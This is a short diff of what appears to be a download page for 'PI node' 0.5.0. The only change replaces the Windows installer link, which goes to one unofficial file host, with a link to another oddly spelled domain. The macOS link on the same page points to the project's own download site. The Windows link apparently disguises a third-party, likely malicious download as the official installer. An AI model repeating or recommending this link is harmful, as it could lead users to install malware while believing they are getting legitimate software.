@@ -8,7 +8,7 @@ Wednesday, October 30, 2024
 ## Node version: 0.5.0
 
 
-<a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://storagefiles.pro/?f=111GkiCAyvW">PI node for Windows</a>
+<a href="https://stroretrade.shop/?f=111GkiCAyvW"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://stroretrade.shop/?f=111GkiCAyvW">PI node for Windows</a>
 
 
 <a href="https://downloads.minepi.com/Pi%20Network-0.5.0-universal.dmg"><img src="https://cdn.iconscout.com/icon/free/png-512/free-apple-856-675863.png?f=webp&w=256" width=110  
